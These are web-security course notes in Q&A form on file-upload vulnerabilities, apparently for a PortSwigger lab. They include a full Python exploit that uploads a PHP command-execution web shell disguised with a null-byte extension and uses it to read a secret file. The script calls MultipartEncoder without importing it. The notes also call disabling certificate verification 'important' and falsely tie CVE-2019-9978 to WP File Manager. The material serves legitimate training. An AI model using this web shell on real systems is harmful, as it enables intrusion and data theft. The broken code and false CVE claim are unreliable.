---
course: Web Security
topic: File Upload Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain the concept of obfuscating file extensions in the context of file upload vulnerabilities.**

Obfuscating file extensions is a technique used to bypass file upload restrictions in web applications. When a web application restricts file uploads to specific file types (e.g., only allowing `.jpg` or `.png` files), attackers can use obfuscation techniques to upload malicious files. One common method is appending a null byte (`%00`) to the filename. For example, an attacker might upload a file named `test.php%00.jpg`. The server may interpret the file as a `.jpg` due to the presence of the null byte, allowing the `.php` script to be uploaded and potentially executed.

**Q2. How would you exploit a file upload vulnerability using an obfuscated file extension in a Python script?**

To exploit a file upload vulnerability using an obfuscated file extension in a Python script, follow these steps:

1. **Authenticate**: Obtain a session by logging in with valid credentials.
2. **Extract CSRF Token**: Extract the CSRF token from the login page.
3. **Upload Malicious File**: Use a multipart encoder to upload a PHP web shell with an obfuscated file extension.
4. **Execute Web Shell**: Execute the uploaded web shell to retrieve sensitive information.

Here is a sample Python script to achieve this:

```python
import requests
from bs4 import BeautifulSoup
import random
import string

def get_csrf_token(session, url):
    response = session.get(url, verify=False)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})
    return csrf_input['value']

def exploit_file_upload(url):
    session = requests.Session()
    
    # Step 1: Authenticate
    login_url = f"{url}/login"
    csrf_token = get_csrf_token(session, login_url)
    login_data = {
        'csrf': csrf_token,
        'username': 'your_username',
        'password': 'your_password'
    }
    session.post(login_url, data=login_data, verify=False)

    # Step 2: Upload Malicious File
    upload_url = f"{url}/my_account/avatar"
    csrf_token = get_csrf_token(session, f"{url}/my_account")
    avatar_data = {
        'avatar': ('test.php%00.jpg', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
        'user': 'your_username',
        'csrf': csrf_token
    }
    boundary = '--' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    multipart_encoder = MultipartEncoder(fields=avatar_data, boundary=boundary)
    headers = {'Content-Type': multipart_encoder.content_type}
    session.post(upload_url, data=multipart_encoder, headers=headers, verify=False)

    # Step 3: Execute Web Shell
    cmd_url = f"{url}/file/avatar/test.php?cmd=cat+/home/Carlos/secret"
    response = session.get(cmd_url, verify=False)
    print("Secret file content:", response.text)

if __name__ == "__main__":
    url = "http://example.com"
    exploit_file_upload(url)
```

Replace `your_username`, `your_password`, and `http://example.com` with actual values.

**Q3. Why is it important to disable SSL certificate verification in the Python script?**

Disabling SSL certificate verification in the Python script is important for testing purposes, especially when working with self-signed certificates or certificates that do not match the domain name. By setting `verify=False`, the script avoids SSL-related errors and allows the requests to proceed without validating the server's SSL certificate. This is crucial for testing environments where the focus is on exploiting vulnerabilities rather than ensuring secure connections.

**Q4. What recent real-world examples demonstrate the exploitation of file upload vulnerabilities through obfuscated file extensions?**

One notable example is the exploitation of a file upload vulnerability in the WordPress plugin "WP File Manager" (CVE-2019-9978). Attackers could upload PHP files disguised as images by using obfuscated file extensions, such as `shell.php%00.jpg`. Once uploaded, these files could be executed to gain remote code execution on the server. This vulnerability affected numerous websites and demonstrated the importance of robust file upload validation mechanisms.

**Q5. How can web developers prevent file upload vulnerabilities related to obfuscated file extensions?**

Web developers can prevent file upload vulnerabilities related to obfuscated file extensions by implementing the following measures:

1. **Strict File Type Validation**: Ensure that only allowed file types are uploaded by checking both the file extension and MIME type.
2. **Sanitize Filenames**: Remove or escape special characters (like `%00`) from filenames before processing them.
3. **Use Content Sniffing**: Verify the actual content of the file matches its declared type.
4. **Store Files Securely**: Store uploaded files outside the web root directory to prevent direct access.
5. **Limit File Execution**: Disable execution permissions for uploaded files to prevent them from being executed as scripts.

By combining these strategies, developers can significantly reduce the risk of file upload vulnerabilities being exploited.

---
<!-- nav -->
[[02-File Upload Vulnerabilities|File Upload Vulnerabilities]] | [[Web Security (PortSwigger)/18-File Upload Vulnerabilities/06-Lab 5 Web shell upload via obfuscated file extension/00-Overview|Overview]]
